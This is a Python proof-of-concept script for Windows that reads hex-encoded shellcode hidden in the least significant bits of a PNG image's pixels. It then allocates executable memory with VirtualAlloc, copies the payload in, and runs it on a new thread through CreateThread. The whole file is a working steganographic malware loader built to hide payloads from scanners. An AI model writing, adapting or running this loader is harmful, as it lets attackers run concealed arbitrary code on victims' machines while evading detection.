#!/usr/bin/python
from PIL import Image
import ctypes
import binascii


def binary_to_text(binary_data):
    # Convert binary data to text format
    return ''.join(chr(int(binary_data[i:i+8], 2)) for i in range(0, len(binary_data), 8))

def decode_lsb(encoded_image_path):
    encoded_image = Image.open(encoded_image_path)
    
    # Convert the image to RGB mode (if it's not already)
    encoded_image = encoded_image.convert("RGB")

    width, heigthread = encoded_image.size
    binary_data = ""

    # Extract binary data from the least significant bits of the pixels
    for y in range(heigthread):
        for x in range(width):
            pixel = encoded_image.getpixel((x, y))
            for channel in range(3):  # 3 channels (RGB)
                # Extract the least significant bit and append to binary data
                binary_data += format(pixel[channel] & 1, '01')

    # Find the index of the null character '\0' to mark the end of the data
    end_index = binary_data.find("00000000")
    binary_data = binary_data[:end_index]
    plaintext_data = binary_to_text(binary_data)

    if plaintext_data[-1:] != '"':
        bad_char = plaintext_data[-1:]
        plaintext_data = plaintext_data.replace(bad_char, '"')
    hex_array = plaintext_data.split('"')
    buffer = b''
    for i in hex_array:
        if i != '':
            buffer += '{}'.format(i).encode()
    return buffer


def shellcode_exec(shellcode_raw):

    shellcode = bytearray(shellcode_raw)

    pointer = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
 
    buffer = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
 
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(pointer),
                                     buffer,
                                     ctypes.c_int(len(shellcode)))
 
    thread = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(pointer),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))
 
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(thread),
                                        ctypes.c_int(-1))

encoded_image_path = "poc_example.png"
shellcode_str = decode_lsb(encoded_image_path)
shellcode = binascii.unhexlify(shellcode_str.decode().replace('\\x', ''))
shellcode_exec(shellcode)